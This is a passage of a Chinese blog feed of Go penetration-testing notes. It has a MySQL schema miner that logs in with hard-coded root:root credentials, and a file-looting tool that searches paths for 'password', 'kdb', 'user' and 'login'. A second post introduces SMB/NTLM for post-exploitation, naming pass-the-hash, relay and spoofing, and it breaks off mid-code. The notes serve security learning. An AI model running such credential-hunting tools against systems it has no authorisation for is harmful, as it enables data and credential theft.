class="type">string</span></span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line">ret += fmt.Sprint(database.String() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Database)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;[DB] = %+s\n&quot;</span>, d.Name)</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> d.Tables &#123;</span><br><span class="line">ret += table.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t Table)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;    [TABLE] = %+s\n&quot;</span>, t.Name)</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> t.Columns &#123;</span><br><span class="line">ret += fmt.Sprintf(<span class="string">&quot;       [COL] = %+s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码首先定义了一个名为<code>DatabaseMiner</code>的接口，实现接口的任何数据类型都需要一个名为<code>GetSchema</code>的方法。每个后端数据库都可能有特定的逻辑来检索数据库模式。</p><p>定义一个<code>Schema</code>类型，该类型由也在此处定义的一些子类组成。我们使用<code>Schema</code>类型在逻辑上表示数据库架构，即数据库，表和列。接口中定义的函数<code>GetSchema()</code>希望返回一个 * Schema(Schema类型的指针)</p><p>现在定义一个名为<code>Search()</code>的函数，函数<code>Search()</code>希望在函数调用期间将<code>DatabaseMiner</code>实例传递给它。它将miner的值储存在一个名为<code>m</code>的变量中，然后使用<code>m.GetSchema()</code>来检索。然后循环遍历整个模式。再根据正则表达式(regex)值列表搜索匹配到的列明。如果能找到，则将数据库模式和匹配字段打印到屏幕上。</p><p>最后，定义一个名为<code>getRegex</code>的函数，此函数使用<code>Go</code>的<code>regex</code>包预编译正则表达式，并返回这些值的一部分。</p><h3 id="2-开始实现"><a href="#2-开始实现" class="headerlink" title="2. 开始实现"></a>2. 开始实现</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-7/db/dbminer&quot;</span></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MySQLMiner <span class="keyword">struct</span> &#123;</span><br><span class="line">Host <span class="type">string</span></span><br><span class="line">Db   sql.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host <span class="type">string</span>)</span></span> (*MySQLMiner, <span class="type">error</span>) &#123;</span><br><span class="line">m := MySQLMiner&#123;Host: host&#125;</span><br><span class="line">err := m.connect()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;m, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> connect() <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, fmt.Sprintf(<span class="string">&quot;root:root@tcp(%s:3306)/information_schema&quot;</span>, m.Host))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">m.Db = *db</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> GetSchema() (*dbminer.Schema, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">new</span>(dbminer.Schema)</span><br><span class="line"></span><br><span class="line">sql := <span class="string">`SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns</span></span><br><span class="line"><span class="string">WHERE TABLE_SCHEMA NOT IN (&#x27;mysql&#x27;, &#x27;information_schema&#x27;, &#x27;performance_schema&#x27;, &#x27;sys&#x27;)</span></span><br><span class="line"><span class="string">ORDER BY TABLE_SCHEMA, TABLE_NAME`</span></span><br><span class="line">schemarows, err := m.Db.Query(sql)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> schemarows.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> prevschema, prevtable <span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> db dbminer.Database</span><br><span class="line"><span class="keyword">var</span> table dbminer.Table</span><br><span class="line"><span class="keyword">for</span> schemarows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> currschema, currtable, currcol <span class="type">string</span></span><br><span class="line"><span class="keyword">if</span> err := schemarows.Scan(&amp;currschema, &amp;currtable, &amp;currcol); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> currschema != prevschema &#123;</span><br><span class="line"><span class="keyword">if</span> prevschema != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line">&#125;</span><br><span class="line">db = dbminer.Database&#123;Name: currschema, Tables: []dbminer.Table&#123;&#125;&#125;</span><br><span class="line">prevschema = currschema</span><br><span class="line">prevtable = <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> currtable != prevtable &#123;</span><br><span class="line"><span class="keyword">if</span> prevtable != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">&#125;</span><br><span class="line">table = dbminer.Table&#123;Name: currtable, Columns: []<span class="type">string</span>&#123;&#125;&#125;</span><br><span class="line">prevtable = currtable</span><br><span class="line">&#125;</span><br><span class="line">table.Columns = <span class="built_in">append</span>(table.Columns, currcol)</span><br><span class="line">&#125;</span><br><span class="line">db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line"><span class="keyword">if</span> err := schemarows.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">mm, err := New(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> mm.Db.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := dbminer.Search(mm); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-文件掠夺系统"><a href="#0x04-文件掠夺系统" class="headerlink" title="0x04 文件掠夺系统"></a>0x04 文件掠夺系统</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="title function_">import</span> <span class="params">(</span></span><br><span class="line"><span class="params"><span class="string">&quot;fmt&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;log&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;os&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;path/filepath&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;regexp&quot;</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">regexes</span> <span class="operator">=</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(`(?i)user`),</span><br><span class="line">regexp.MustCompile(`(?i)password`),</span><br><span class="line">regexp.MustCompile(`(?i)kdb`),</span><br><span class="line">regexp.MustCompile(`(?i)login`),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title function_">walkFn</span><span class="params">(path string, f os.FileInfo, err error)</span> error &#123;</span><br><span class="line"><span class="keyword">for</span> _, r := range regexes &#123;</span><br><span class="line"><span class="keyword">if</span> r.MatchString(path) &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, path)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">root := os.Args[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> err := filepath.Walk(root, walkFn); err != nil &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对数据库和文件系统的学习</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(六)</title>
    <link href="https://h0ld1rs.github.io/posts/36907.html"/>
    <id>https://h0ld1rs.github.io/posts/36907.html</id>
    <published>2022-03-05T03:16:23.000Z</published>
    <updated>2022-03-05T12:30:57.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-六-–与SMB和NTLM交互"><a href="#Go渗透测试笔记-六-–与SMB和NTLM交互" class="headerlink" title="Go渗透测试笔记(六)–与SMB和NTLM交互"></a>Go渗透测试笔记(六)–与SMB和NTLM交互</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的学习中，我们研究了用于网络通信的三种协议：TCP，HTTP和DNS，这次我们使用<code>SMB(服务器消息块)</code>(Server Message Block)协议来对网络协议进行讨论。<code>SMB</code>被证明是针对<code>Windows</code>系统后渗透中最有用的协议。</p><p>SMB具有多种用途，通常用于网上共享资源，例如，文件打印机和串行端口。如果有攻击意识，SMB允许通过命名管道在分布式网络节点之间进行通信。换句话说，你可以在远程主机上执行任意命令。这就需要用到<code>PsExec(一种在本地执行远程命令的windows工具)</code></p><p>SMB还有一些其他用途，主要得益于它处理<code>NTLM</code>身份的验证方法，该身份验证是<code>Windows</code>网络上大量使用的<code>质询--响应</code>安全协议。用途包括，远程密码猜测，基于散列的身份验证(pass-the-hash)，SMB中继和<code>NBNS/LLMNR</code>欺骗</p><h2 id="0x01-SMB包"><a href="#0x01-SMB包" class="headerlink" title="0x01 SMB包"></a>0x01 SMB包</h2><p>由于没有现成的SMB包，所以使用作者编写的</p><p><code>https://github.com/blackhat-go/bhg/tree/master/ch-6/smb</code></p><p>改天去挖掘一下源代码</p><h2 id="0x02-理解SMB"><a href="#0x02-理解SMB" class="headerlink" title="0x02 理解SMB"></a>0x02 理解SMB</h2><p>SMB是一种应用层协议，它类似于HTTP协议，允许网络节点之间互相通信。与HTTP1.1(使用ASCII 可读写文本进行通信)不同，SMB是一种二进制协议，使用固定长度和可变长度，位置与低字节序字段的组合。SMB有多个版本，2.0，2.1，3.0，3.0.2和3.1.1.由于每个版本的处理方式和要求各不相通，因此客户端和服务器必须事先约定好要使用哪个版本。</p><p>其中<code>Windows</code>系统支持多个版本，Microsoft提供了一个表格，显示在协商过程中要安装哪个版本</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220305120724.png"></p><p>图片来源：<a href="https://kb-cn.netapp.com/Advice_and_Troubleshooting/Data_Storage_Software/ONTAP_OS/What_is_the_default_negotiated_SMB_version_with_various_versions_of_Data_ONTAP_and_Windows_clients">https://kb-cn.netapp.com/Advice_and_Troubleshooting/Data_Storage_Software/ONTAP_OS/What_is_the_default_negotiated_SMB_version_with_various_versions_of_Data_ONTAP_and_Windows_clients</a></p><p>在这里，我们使用SMB 2.1</p><h3 id="1-理解SMB安全令牌"><a href="#1-理解SMB安全令牌" class="headerlink" title="1. 理解SMB安全令牌"></a>1. 理解SMB安全令牌</h3><p>SMB消息包含用于对网络中的用户和计算机进行身份验证的安全令牌。通过一系列会话消息来选择身份认证机制。该消息允许客户端和服务器就相互支持的身份验证类型达成一致。<code>Active Directory</code>域通常使用<code>NTLM</code>安全支持提供程序(NTLMSSP)，后者是一个二进制的网络协议，该协议将<code>NTLM</code>密码散列和<code>质询-响应</code>，令牌结合使用，以便在网络上进行用户的身份认证。</p><blockquote><p>质询-响应令牌可以理解为一个加密答案，除了NTLMSSP之外，还有一种常见的身份认证机制，即<code>Kerberos</code></p></blockquote><p>将身份认证机制与SMB规范分开，可以使SMB在不同的环境中使用不同的身份验证方法。具体取决于域和企业的安全要求，以及客户端-服务器的支持。但是，将身份验证机制和SMB规范分开，使Go创建更加困难。而格式与我们将用于普通的SMB的位置二进制编码不同，这种混合编码增加了复杂性。</p><h3 id="2-创建一个SMB会话"><a href="#2-创建一个SMB会话" class="headerlink" title="2. 创建一个SMB会话"></a>2. 创建一个SMB会话</h3><p>客户端和服务器执行以下过程以成功设置<code>SMB2.1</code>会话并选择<code>NTLPSSP</code>方言</p><ol><li><p>客户端向服务器发送协商协议(Negotiate Protocol)请求，该消息中包含客户端支持的方言列表。</p></li><li><p>服务器以协商协议响应消息作为响应，该消息表明服务器选择的方言，将来的消息都将使用该方言，响应中包含服务器支持的身份验证机制列表。</p></li><li><p>客户端选择一种受支持的身份验证类型，例如<code>NTLMSSP</code>，并使用该信息创建会话设置请求消息发送到服务器，该消息中包含一个序列化的安全结构，表明他是<code>NTLMSSP</code>协商请求</p></li><li><p>服务器以会话设置响应消息答复。此消息表明需要更多处理，且此消息中包含服务器质询令牌。</p></li><li><p>客户端计算用户的<code>NTLM</code>散列值(使用域，用户密码作为输入)，，然后将其与服务器质询，随机客户端质询和其他数据结合起来生成质询响应。它包含在客户端发送给服务器的新会话设置请求消息中。而该消息中包含的序列化的安全结构规则表明其是<code>NTLMSSP</code>身份验证请求。这样，服务器就可以区分两个会话设置<code>SMB</code>请求。</p></li><li><p>服务器与权威性资源(例如使用域凭据进行身份验证的域控制器)进行交互。以将客户端提供的质询-响应信息与权威性紫泉计算出的值进行比较，如果他们匹配，则对客户端进行身份认证，服务器会话设置响应消息发送给客户端，表示登录成功(该消息中包含客户端，可以用来跟踪会话状态的唯一会话标识符)</p></li><li><p>客户端发送其他消息以访问文件共享，命名管道，打印机等，每个消息都包含特定的会话标识符，服务器可以通过该标识符来验证客户端的身份状态。</p></li></ol><p>以下是一些相关规范</p><blockquote><p>MS-SMB2</p><p>MS-SPNG 和 RFC 4178 封装了 MS-NLMP数据的<code>GSS-API</code>规范</p><p>MS-NTLM</p><p>AN&#x3D;SN.1</p></blockquote><h3 id="3-使用结构域的混合编码"><a href="#3-使用结构域的混合编码" class="headerlink" title="3. 使用结构域的混合编码"></a>3. 使用结构域的混合编码</h3><p>SMB规范要求对大多数消息数据进行位置，二进制，低字节序，固定和可变长度编码。但是某些字段需要进行<code>ASN.1</code>编码，该字段使用显式标记符来标识字段索引，类型和长度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type Foo <span class="keyword">struct</span>&#123;</span><br><span class="line">    x <span class="type">int</span></span><br><span class="line">    y []<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Message <span class="keyword">struct</span>&#123;</span><br><span class="line">    A <span class="type">int</span> <span class="comment">//二进制，位置编码</span></span><br><span class="line">    B Foo <span class="comment">//规范要求的ASN.1 编码</span></span><br><span class="line">    C <span class="type">bool</span> <span class="comment">// 二进制，位置编码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无法使用i相同的编码方案对结构体<code>Message</code>中的所有类型进行编码，因为<code>Foo</code>类型的B字段需要使用<code>ASN.1</code>编码</p><h4 id="1-编写自定义的序列化和反序列化结构"><a href="#1-编写自定义的序列化和反序列化结构" class="headerlink" title="1. 编写自定义的序列化和反序列化结构"></a>1. 编写自定义的序列化和反序列化结构</h4><p>Go的二进制包的行为方式与它递归地对所有结构体字段进行编码的方式相同。但没有什么用，因为需要混合编码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary.Write(someWriter,binary.LittleEndian,message)</span><br></pre></td></tr></table></figure><p>要解决此问题，可以创建一个接口，该接口允许任意类型的自定义序列化和反序列化逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BinaryMarshallable <span class="keyword">interface</span> &#123;</span><br><span class="line">MarshalBinary(*Metadata) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line">UnmarshalBinary([]<span class="type">byte</span>, *Metadata) <span class="type">error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-包装接口"><a href="#2-包装接口" class="headerlink" title="2. 包装接口"></a>2. 包装接口</h4><p>任何实现了接口<code>BinaryMarshallable</code>的类型都可以控制自己的编码，我们需要创建包装函数<code>marsgal()</code>和<code>unmarshal()</code>，在其中检查数据以确定该类型是否实现了接口<code>BinaryMarshakkable</code>，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">marshal</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;, meta *Metadata)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> ret []<span class="type">byte</span></span><br><span class="line">typev := reflect.TypeOf(v)</span><br><span class="line">valuev := reflect.ValueOf(v)</span><br><span class="line"></span><br><span class="line">bm, ok := v.(BinaryMarshallable)</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line"><span class="comment">// Custom marshallable interface found.</span></span><br><span class="line">buf, err := bm.MarshalBinary(meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> buf, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> typev.Kind() == reflect.Ptr &#123;</span><br><span class="line">valuev = reflect.Indirect(reflect.ValueOf(v))</span><br><span class="line">typev = valuev.Type()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w := bytes.NewBuffer(ret)</span><br><span class="line"><span class="keyword">switch</span> typev.Kind() &#123;</span><br><span class="line"><span class="keyword">case</span> reflect.Struct:</span><br><span class="line">m := &amp;Metadata&#123;</span><br><span class="line">Tags:   &amp;TagMap&#123;&#125;,</span><br><span class="line">Lens:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">uint64</span>),</span><br><span class="line">Parent: v,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; valuev.NumField(); j++ &#123;</span><br><span class="line">tags, err := parseTags(typev.Field(j))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">m.Tags = tags</span><br><span class="line">buf, err := marshal(valuev.Field(j).Interface(), m)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">m.Lens[typev.Field(j).Name] = <span class="type">uint64</span>(<span class="built_in">len</span>(buf))</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Slice, reflect.Array:</span><br><span class="line"><span class="keyword">switch</span> typev.Elem().Kind() &#123;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint8:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, v.([]<span class="type">uint8</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint16:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, v.([]<span class="type">uint16</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint8:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, valuev.Interface().(<span class="type">uint8</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint16:</span><br><span class="line">data := valuev.Interface().(<span class="type">uint16</span>)</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;len&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;len&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getFieldLengthByName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint16</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;offset&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;offset&quot;</span>)</span><br><span class="line"><span 